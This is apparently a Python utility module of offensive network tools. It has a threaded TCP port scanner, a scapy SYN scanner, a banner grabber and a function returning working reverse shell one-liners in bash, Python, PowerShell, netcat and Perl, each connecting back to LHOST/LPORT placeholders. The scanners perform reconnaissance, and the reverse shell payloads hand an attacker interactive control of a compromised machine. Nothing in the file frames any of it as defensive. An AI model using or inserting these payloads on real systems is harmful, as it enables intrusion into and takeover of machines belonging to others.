# language: Python, file: utils/net.py
import socket
import struct
import threading


def port_scan(host, ports, timeout=0.5):
    """fast TCP connect scan"""
    open_ports = []
    def check(p):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        try:
            if s.connect_ex((host, p)) == 0:
                open_ports.append(p)
        finally:
            s.close()
    threads = [threading.Thread(target=check, args=(p,)) for p in ports]
    for t in threads: t.start()
    for t in threads: t.join()
    return sorted(open_ports)


def syn_scan(host, ports):
    """requires root — raw SYN, no full handshake"""
    try:
        from scapy.all import IP, TCP, sr1, conf
        conf.verb = 0
        results = []
        for p in ports:
            pkt = IP(dst=host)/TCP(dport=p, flags="S")
            resp = sr1(pkt, timeout=1)
            if resp and resp.haslayer(TCP):
                if resp[TCP].flags == 0x12:  # SYN-ACK
                    results.append((p, "open"))
                    sr1(IP(dst=host)/TCP(dport=p, flags="R"), timeout=1)
                elif resp[TCP].flags == 0x14:  # RST
                    results.append((p, "closed"))
        return results
    except ImportError:
        return [("error", "scapy not installed")]


def banner_grab(host, port, timeout=3):
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        s.send(b"\r\n")
        banner = s.recv(1024).decode(errors="ignore").strip()
        s.close()
        return banner
    except Exception as e:
        return f"error: {e}"


def reverse_shell_snippets():
    return {
        "bash": "bash -i >& /dev/tcp/LHOST/LPORT 0>&1",
        "python": "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"LHOST\",LPORT));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call([\"/bin/sh\",\"-i\"])'",
        "powershell": "powershell -NoP -NonI -W Hidden -c \"$c=New-Object Net.Sockets.TCPClient('LHOST',LPORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([Text.Encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length)}\"",
        "nc": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LHOST LPORT >/tmp/f",
        "perl": "perl -e 'use Socket;$i=\"LHOST\";$p=LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
    }
